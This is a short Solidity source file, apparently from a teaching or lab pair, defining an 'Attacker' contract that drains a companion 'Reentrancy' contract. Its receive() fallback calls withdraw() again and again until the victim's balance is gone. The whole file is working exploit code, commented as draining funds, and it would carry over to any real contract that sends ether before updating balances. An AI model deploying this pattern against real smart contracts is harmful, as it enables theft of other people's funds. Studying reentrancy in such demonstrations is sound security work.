// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0; 

import "./Reentrancy.sol";

/**
 * Drains the funds from Reentrancy contract by using a reentrancy attack on the withdraw() method.
 */
contract Attacker {    
    uint256 private withdrawIncrement=0;
    address payable private victimAddr; 
    uint256 private victimBalance = 0;
    
    /**
     * Call this to begin the cycle of recursive calls that will drain the contract. 
     */
    function startDrain(address payable _victimAddr, uint256 _amount) public {
        withdrawIncrement = _amount;
        victimAddr = _victimAddr;
        
        Reentrancy(victimAddr).withdraw(withdrawIncrement);
    }
    
    /**
     * Receive() method recursively calls the target method. 
     */
    receive() external payable { 
        victimBalance = victimAddr.balance;
        if (withdrawIncrement > 0 && victimBalance > 0)
        {
            //make sure we don't overdraw 
            uint256 amt = withdrawIncrement; 
            if (victimBalance < amt) 
                amt = victimBalance;
            Reentrancy(victimAddr).withdraw(amt);
        }
    }
    
    function getVictimBalance() public view returns (uint256) {
        return victimBalance;
    }
}